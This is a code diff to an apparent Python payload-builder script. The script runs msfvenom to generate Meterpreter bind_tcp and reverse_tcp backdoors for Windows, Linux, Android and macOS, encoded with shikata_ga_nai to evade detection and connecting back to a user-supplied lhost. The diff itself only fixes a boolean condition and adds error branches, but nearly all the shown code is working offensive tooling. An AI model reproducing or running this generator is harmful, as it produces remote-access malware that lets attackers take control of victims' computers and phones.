@@ -13,7 +13,7 @@ def windows(namder):
         subprocess.check_output(
             f'msfvenom -p windows/meterpreter/bind_tcp lport={port} -e x86/shikata_ga_nai -i 5 -f exe > {directory}{name}.exe', shell=True)
     
-    elif namder == 2 or 4 or 5 or 7 or 8:
+    elif (namder == 2) or (namder == 4) or (namder == 5) or (namder == 7) or (namder == 8):
         host = str(input('lhost: '))
         port = int(input('lport: '))
         directory = str(input('dir: '))
@@ -55,6 +55,9 @@ def windows(namder):
 
         subprocess.call(
             f'msfvenom -p windows/meterpreter/reverse_tcp lhost={host} lport={port} -e x86/shikata_ga_nai -i 5 -f vba', shell=True)
+    
+    else:
+        print('\nError')
 
 def linux(namder):
     if namder == 1 or 2:
@@ -83,6 +86,9 @@ def linux(namder):
 
         subprocess.check_output(
             f'msfvenom -p linux/x86/meterpreter/bind_tcp lport={port} -e x86/shikata_ga_nai -i 5 - f elf > {directory}{name}', shell=True)
+    
+    else:
+        print('\nError')
 
 
 def android(namder):
@@ -115,6 +121,9 @@ def android(namder):
             file.write(directory)
         
         os.system('./tools/apk.sh')
+    
+    else:
+        print('\nError')
 
         
 
@@ -141,3 +150,6 @@ def mac(namder):
         
         subprocess.check_output(
             f'msfvenom -p osx/x64/meterpreter/bind_tcp lport={port} -e x86/shikata_ga_nai -i 5 -f macho > {directory}{name}.macho')
+    
+    else:
+        print('\nError')
